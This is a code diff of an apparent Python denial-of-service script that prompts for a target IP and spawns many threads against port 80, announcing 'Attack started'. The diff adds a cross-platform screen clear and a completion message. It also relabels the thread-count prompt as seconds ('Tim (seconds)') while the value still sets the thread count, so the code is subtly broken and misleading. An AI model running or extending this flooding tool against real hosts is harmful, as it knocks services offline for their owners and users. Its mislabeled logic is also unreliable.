@@ -2,7 +2,9 @@ import os
 import socket
 import threading
 import sys
-os.system('clear')
+
+
+os.system('clear || cls')
 sys.ps1 = '\033[01;32m '
 print(sys.ps1)
 print('''
@@ -19,7 +21,7 @@ print('''
 ''')
 
 target = input("Enter the IP of the Target: ")
-thr = input("How many Threads do ya wanna create?: ")
+thr = input("Tim (seconds): ")
 port = 80
 
 def attack():
@@ -33,3 +35,5 @@ print("Attack started on "+target)
 for i in range(int(thr)):
     thread1 = threading.Thread(target=attack)
     thread1.start()
+
+print("attack time completed")
